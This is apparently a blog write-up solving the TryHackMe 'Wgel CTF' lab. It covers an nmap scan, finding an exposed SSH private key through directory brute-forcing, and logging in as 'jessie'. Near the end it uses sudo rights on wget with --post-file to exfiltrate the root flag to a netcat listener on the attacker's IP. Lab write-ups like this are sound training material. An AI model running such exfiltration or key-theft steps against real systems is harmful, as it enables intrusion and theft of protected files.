# Wgel CTF

***
![](https://tryhackme-images.s3.amazonaws.com/room-icons/8116d1d52d3a63dd1e7c2e7ddce8a0d5.png)

## Difficulty = Easy

***

Running our nmap scan, we discovered 2 ports

```bash
# Nmap 7.94 scan initiated Fri Oct 20 12:19:06 2023 as: nmap -p80,22 -sCV -T4 -v --min-rate=1000 -oN nmap.txt 10.10.172.154
Nmap scan report for 10.10.172.154
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 20 12:19:26 2023 -- 1 IP address (1 host up) scanned in 20.07 seconds
```



Navigating to port `80/HTTP` we have a default Apache web page


![](https://i.imgur.com/cXdxc2a.png)



Viewing **Page-Source** we found a username called **"Jessie"**


![](https://i.imgur.com/Md6J5Nk.png)

Performing dir/file bruteforce we found a sitemap page

![](https://i.imgur.com/LFEDmWj.png)

Navigating to the `/sitemap` page we have a website 


![](https://i.imgur.com/ieSsOAA.png)



After much enumeration it lead to nothing, so i decided to run my dir/file bruteforce again, this time on `/sitemap`


![](https://i.imgur.com/9NGmEtG.png)


As we can see everything here looks normal except from `/.DS_store` and `/.ssh`, it looks like **DS_Store** doesn't seem to contain important information


![](https://i.imgur.com/rcON17e.png)



Navigating to `/.ssh` we have an `id_rsa` file

![](https://i.imgur.com/pMnnZaB.png)

Downloaded the file using `wget`


![](https://i.imgur.com/r2bJoF3.png)

Now let try and login with the username we found, "Jessie"


![](https://i.imgur.com/9cXZQYj.png)

Yeeppee, we are logged in, running `sudo -l` we have permissions to run `wget` with the sudo command

![](https://i.imgur.com/27sbSLN.png)

Generally there are ways to get root with `wget`, but over here, we would just download the root flag. On our attacker machine startup netcat with

```bash
$ nc -lvnp 80 >> root.txt
```

On target machine run the following command to transfer file

```bash
$ sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.9.75.133
```

![](https://i.imgur.com/aVQDTFq.png)

Therefore, we have the root flag downloaded to `root.txt` in our attacker machine

![](https://i.imgur.com/m2RWtKB.png)


That will be all for today ✈️


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>

